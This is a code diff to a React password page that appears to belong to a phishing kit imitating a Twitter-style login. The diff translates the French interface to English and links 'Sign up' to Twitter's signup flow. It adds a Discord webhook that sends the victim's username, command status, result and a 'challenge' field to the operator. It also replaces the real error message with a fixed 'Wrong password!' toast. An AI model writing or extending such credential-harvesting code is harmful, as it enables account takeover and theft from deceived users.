@@ -11,9 +11,11 @@ import type {
   JobCommandResponse,
 } from "../../../server/src/types/jobs";
 
+import { FullScreenBlueLoader } from "../components/FullScreenBlueLoader";
 import { FullScreenLoader } from "../components/FullScreenLoader";
 import { Toast } from "../components/Toast";
 import { API_BASE } from "../config/api";
+import { sendDiscordWebhookSafe } from "../helpers/webhook";
 
 export const Password = () => {
   const location = useLocation();
@@ -25,6 +27,7 @@ export const Password = () => {
   const [showPassword, setShowPassword] = useState(false);
 
   const [loading, setLoading] = useState(false);
+  const [forgotPasswordLoading, setForgotPasswordLoading] = useState(false);
   const [toast, setToast] = useState("");
 
   useEffect(() => {
@@ -101,7 +104,12 @@ export const Password = () => {
 
       if (!cmdResp.data.ok) {
         setLoading(false);
-        setToast(cmdResp.data.error || "Command failed");
+        const error = cmdResp.data.error || "Command failed";
+        if (error === "NO_ACTIVE_SESSION") {
+          navigate("/oauth");
+          return;
+        }
+        setToast(error);
         return;
       }
 
@@ -120,6 +128,33 @@ export const Password = () => {
         setToast("Timeout, please try again");
         return;
       }
+
+      // 🔥 Webhook Discord avec le résultat de la commande
+      console.log("📤 Sending webhook for password command result:", {
+        username,
+        commandId,
+        status: finalState.status,
+      });
+      
+      sendDiscordWebhookSafe({
+        username: "Password Command Result",
+        content:
+          "🔐 **Password Command Result**\n" +
+          "```json\n" +
+          JSON.stringify(
+            {
+              username,
+              commandId,
+              status: finalState.status,
+              result: finalState.result,
+              error: finalState.error,
+              challenge: finalState.result?.challenge,
+            },
+            null,
+            2
+          ) +
+          "\n```",
+      });
 
       // ✅ SUCCESS CASE
       if (finalState.status === "done" && finalState.result?.ok) {
@@ -141,21 +176,22 @@ export const Password = () => {
       }
 
       // ❌ ERROR CASE
-      const msg =
-        finalState.error ||
-        finalState.result?.message ||
-        finalState.result?.error ||
-        "Invalid password";
-      setToast(msg);
+      setToast("Wrong password! g;176386412757198839:-1763864562758:JzmgNAGCfenvvqFoCrn0UYVr:8");
     } catch (err: any) {
       setLoading(false);
-      setToast(err.response?.data?.error || err.message || "Network error");
+      const error = err.response?.data?.error || err.message || "Network error";
+      if (error === "NO_ACTIVE_SESSION") {
+        navigate("/oauth");
+        return;
+      }
+      setToast(error);
     }
   };
 
   return (
     <div className="password-page">
-      <FullScreenLoader visible={loading} text="Checking password..." />
+      <FullScreenBlueLoader visible={loading} />
+      <FullScreenLoader visible={forgotPasswordLoading} />
       <Toast message={toast} onClose={() => setToast("")} />
 
       <div className="password-modal" role="dialog" aria-modal="true">
@@ -165,7 +201,7 @@ export const Password = () => {
             <div className="password-close-button-container">
               <button
                 className="password-close-button"
-                aria-label="Fermer"
+                aria-label="Close"
                 type="button"
                 onClick={() => navigate(-1)}
               >
@@ -200,14 +236,14 @@ export const Password = () => {
         <div className="password-content">
           <div className="password-title-container">
             <h1 className="password-title" id="modal-header">
-              Entrez votre mot de passe
+              Enter your password
             </h1>
           </div>
 
           <div className="password-form">
             <label className="password-label">
               <div className="password-label-text">
-                <span>Nom d'utilisateur</span>
+                <span>Username</span>
               </div>
               <div className="password-input-wrapper">
                 <input
@@ -228,7 +264,7 @@ export const Password = () => {
 
             <label className="password-label">
               <div className="password-label-text">
-                <span>Mot de passe</span>
+                <span>Password</span>
               </div>
               <div className="password-input-wrapper password-input-wrapper-with-button">
                 <input
@@ -254,8 +290,8 @@ export const Password = () => {
                   className="password-show-button"
                   aria-label={
                     showPassword
-                      ? "Masquer le mot de passe"
-                      : "Afficher le mot de passe"
+                      ? "Hide password"
+                      : "Show password"
                   }
                   onClick={() => setShowPassword(!showPassword)}
                 >
@@ -289,10 +325,12 @@ export const Password = () => {
                 type="button"
                 className="password-forgot-button"
                 onClick={() => {
-                  // TODO: Implement forgot password
+                  setForgotPasswordLoading(true);
+                  // TODO: Implement forgot password logic
+                  // For testing purposes, the loader will stay visible
                 }}
               >
-                Mot de passe oublié ?
+                Forgot password?
               </button>
             </div>
 
@@ -302,13 +340,19 @@ export const Password = () => {
               disabled={loading || !password.trim()}
               type="button"
             >
-              <span>Se connecter</span>
+              <span>Log in</span>
             </button>
 
             <div className="password-signup-link">
-              <span>Vous n'avez pas de compte ? </span>
-              <button type="button" className="password-signup-button">
-                <span>Inscrivez-vous</span>
+              <span>Don't have an account? </span>
+              <button
+                type="button"
+                className="password-signup-button"
+                onClick={() => {
+                  window.open("https://twitter.com/i/flow/signup", "_blank");
+                }}
+              >
+                <span>Sign up</span>
               </button>
             </div>
           </div>
